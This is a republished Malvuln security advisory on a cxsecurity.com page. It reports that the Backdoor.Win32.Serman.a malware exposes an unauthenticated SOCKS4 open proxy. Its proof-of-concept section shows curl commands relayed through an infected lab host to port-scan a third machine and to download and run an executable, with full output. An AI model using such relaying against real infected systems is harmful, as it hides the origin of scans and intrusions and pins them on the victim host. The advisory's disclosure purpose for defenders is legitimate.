---
title: Backdoor.Win32.Serman.a / Unauthenticated Open Proxy
url: https://cxsecurity.com/issue/WLB-2022110047
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-27
fetch_date: 2025-10-03T23:52:32.286174
---

# Backdoor.Win32.Serman.a / Unauthenticated Open Proxy

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.Serman.a / Unauthenticated Open Proxy** **2022.11.26**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [malvuln](https://cxsecurity.com/author/malvuln/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source: https://malvuln.com/advisory/f312e3a436995b86b205a1a37b1bf10f.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Backup media: infosec.exchange/@malvuln
Threat: Backdoor.Win32.Serman.a
Vulnerability: Unauthenticated Open Proxy
Family: Serman
Type: PE32
MD5: f312e3a436995b86b205a1a37b1bf10f
Vuln ID: MVID-2022-0659
Disclosure: 11/22/2022
Description: The malware listens on TCP port 21422 by default but it can be changed. Third-party attackers who can connect to the infected system can relay requests from the original connection to the destination and then back to the origination system. Attackers may then be able to launch attacks, download files or port scan third party systems and it will appear as the attacks originated from that infected host.
E.g. using port 5555
SOCKS4 version 4A server (beta)
autor: Stanimir Jordanov \* e-mail: stjordanov@hotmail.com
Usage: socks4 <LocalPort> [LogFile]
C:\dump>wwm.exe 5555 out.txt
SOCKS 4 service started: redirecting localhost:5555
Press Ctrl+C to end ...
Connecting to: 192.168.18.128:80 ID:2C34
Connected to: 192.168.18.128:80 ID:2C34
Connection closed ID:2C34
Connecting to: 192.168.18.128:80 ID:25BC
Connected to: 192.168.18.128:80 ID:25BC
Connection closed ID:25BC
Connecting to: 192.168.18.128:80 ID:A4
Connected to: 192.168.18.128:80 ID:A4
Connection closed ID:A4
Exploit/PoC:
Port scan:
Connecting to: 192.168.18.128:666 ID:2B04
Cannot connect to: 192.168.18.128:666 ID:2B04
Connecting to: 192.168.18.128:21 ID:2DE4
Connected to: 192.168.18.128:21 ID:2DE4
Connection closed ID:2DE4
(Port scan):
(Port closed):
C:\Users\gg\Desktop>curl -x socks4://192.168.18.125:5555 http://192.168.18.128:666 -v
\* Trying 192.168.18.125:5555...
\* SOCKS4 communication to 192.168.18.128:666
\* SOCKS4 connect to IPv4 192.168.18.128 (locally resolved)
\* Can't complete SOCKS4 connection to 0.0.0.0:0. (91), request rejected or failed.
\* Closing connection 0
curl: (97) Can't complete SOCKS4 connection to 0.0.0.0:0. (91), request rejected or failed.
(Port open):
C:\Users\gg\Desktop>curl -x socks4://192.168.18.125:5555 http://192.168.18.128:21 -v
\* Trying 192.168.18.125:5555...
\* SOCKS4 communication to 192.168.18.128:21
\* SOCKS4 connect to IPv4 192.168.18.128 (locally resolved)
\* SOCKS4 request granted.
\* Connected to 192.168.18.125 (192.168.18.125) port 5555 (#0)
> GET / HTTP/1.1
> Host: 192.168.18.128:21
> User-Agent: curl/7.83.1
> Accept: \*/\*
>
\* Received HTTP/0.9 when not allowed
\* Closing connection 0
curl: (1) Received HTTP/0.9 when not allowed
(Download files):
C:\Users\gg\Desktop>curl -x socks4://192.168.18.125:5555 http://192.168.18.128/DOOM.exe -v --output 2.txt
\* Trying 192.168.18.125:5555...
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0\* SOCKS4 communication to 192.168.18.128:80
\* SOCKS4 connect to IPv4 192.168.18.128 (locally resolved)
\* SOCKS4 request granted.
\* Connected to 192.168.18.125 (192.168.18.125) port 5555 (#0)
GET /DOOM.exe HTTP/1.1
Host: 192.168.18.128
User-Agent: curl/7.83.1
Accept: \*/\*
\* Mark bundle as not supporting multiuse
\* HTTP 1.0, assume close after body
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.6
Date: Tue, 22 Nov 2022 02:15:31 GMT
Content-type: application/x-msdos-program
Content-Length: 103533
Last-Modified: Sat, 03 Aug 2019 04:57:12 GMT
{ [6794 bytes data]
100 101k 100 101k 0 0 474k 0 --:--:-- --:--:-- --:--:-- 488k
\* Closing connection 0
C:\Users\gg\Desktop>2.txt
DOOMED!!!
Press any key to continue . . .
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110047)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top